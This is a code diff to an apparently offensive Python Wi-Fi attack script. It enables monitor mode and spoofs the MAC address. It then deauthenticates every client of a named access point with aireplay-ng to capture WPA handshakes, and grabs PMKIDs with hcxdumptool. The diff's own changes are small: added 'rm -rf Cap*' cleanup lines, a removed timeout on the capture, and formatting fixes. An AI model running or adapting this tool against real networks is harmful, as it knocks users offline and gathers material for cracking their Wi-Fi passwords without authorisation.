@@ -12,9 +12,11 @@ def ctrl_c(signum, frame):
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "yellow")
+    get_colours("\nClearing Temporary files..", "red")
+    os.system("rm -rf Cap*")
     time.sleep(2)
     get_colours("\n[*] Exiting the program...", "blue")
-    print(Fore.WHITE) # To avoid leaving the terminal with colors.
+    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
     exit(1)
 
 
@@ -95,7 +97,7 @@ def check_deps():
         get_colours(f"\nhcxdumpTool \t\t {Fore.RED + '(X)'}", "red")
         get_colours("\nInstalling [hcxdumpTool]....", "magenta")
         install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
-                                           text=True)
+                                         text=True)
         if "Setting up hcxdumptool" in install_hcxdump.stdout:
             get_colours("\n[*] hcxdumpTool Installed...", "blue")
             program_status = True
@@ -121,13 +123,13 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-    # subprocess.run(["killall", "dhclient", "wpa_supplicant"], stdout=subprocess.DEVNULL)
     get_colours("\nNew Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
 
     # HandShake Attack Mode
     if attack_mode == "Handshake":
+        # subprocess.run(["killall", "dhclient", "wpa_supplicant"], stdout=subprocess.DEVNULL)
         os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
         airodump_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
         access_point_name = input(Fore.YELLOW + "Access point name: ")
@@ -136,7 +138,7 @@ def attack_func(network_interface, attack_mode):
             os.system(f"sudo kill {airodump_pid.stdout}")
         time.sleep(1)
         os.system(
-            f"xterm -hold -e airodump-ng -c {access_point_channel} -w HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
+            f"xterm -hold -e airodump-ng -c {access_point_channel} --write HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
         time.sleep(4)
         os.system(
             f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
@@ -157,7 +159,7 @@ def attack_func(network_interface, attack_mode):
         time.sleep(3)
         get_colours("", "yellow")
         subprocess.run(
-            ["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-t", "5", "-o",
+            ["sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o",
              "Capture_PKMID"])
         get_colours("\nClearing Temporary files..", "red")
         time.sleep(3)
@@ -185,6 +187,8 @@ def quit_program():
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("Network set to it's normal mode...", "magenta")
+    get_colours("\nClearing Temporary files..", "red")
+    os.system("rm -rf Cap*")
     print(Fore.WHITE)
     time.sleep(3)
     exit(0)
